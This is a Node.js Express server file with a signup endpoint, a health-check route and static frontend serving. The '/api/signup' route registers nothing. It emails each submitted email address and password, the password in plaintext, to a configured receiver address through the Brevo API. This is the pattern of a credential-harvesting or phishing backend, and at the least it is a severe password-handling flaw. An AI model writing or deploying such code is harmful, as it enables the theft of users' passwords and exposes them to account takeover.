import express from "express";
import path from "path";
import dotenv from "dotenv";
import * as SibApiV3Sdk from "@sendinblue/client";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.use(express.json());

  // ✅ HEALTH CHECK ROUTE (fixes "Cannot GET /")
  app.get("/", (req, res) => {
    res.send("Server is running 🚀");
  });

  // ✅ SIGNUP ROUTE
  app.post("/api/signup", async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({
        error: "Email and password are required",
      });
    }

    const brevoKey = process.env.BREVO_API_KEY;
    const receiverEmail = process.env.RECEIVER_EMAIL;
    const senderEmail = process.env.EMAIL_USER;

    if (!brevoKey || !receiverEmail || !senderEmail) {
      console.error("Missing env variables");
      return res.status(500).json({ error: "Server misconfigured" });
    }

    try {
      console.log("📨 Sending Brevo email...");

      const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();

      apiInstance.setApiKey(
        SibApiV3Sdk.TransactionalEmailsApiApiKeys.apiKey,
        brevoKey
      );

      const result = await apiInstance.sendTransacEmail({
        sender: {
          email: senderEmail,
          name: "Signup System",
        },
        to: [
          {
            email: receiverEmail,
          },
        ],
        subject: "New Signup Received",
        htmlContent: `
          <h2>New Signup</h2>
          <p><b>Email:</b> ${email}</p>
          <p><b>Password:</b> ${password}</p>
        `,
      });

      console.log("✅ Brevo success:", result);

      return res.status(200).json({
        success: true,
        message: "Email sent successfully",
      });
    } catch (err) {
      console.error("❌ Brevo error:", err);
      return res.status(500).json({
        error: "Failed to send email",
      });
    }
  });

  // ✅ PRODUCTION FRONTEND FIX (IMPORTANT FOR RENDER)
  const distPath = path.resolve("dist");

  app.use(express.static(distPath));

  app.get("*", (req, res) => {
    res.sendFile(path.join(distPath, "index.html"));
  });

  // ✅ START SERVER (Render requirement)
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();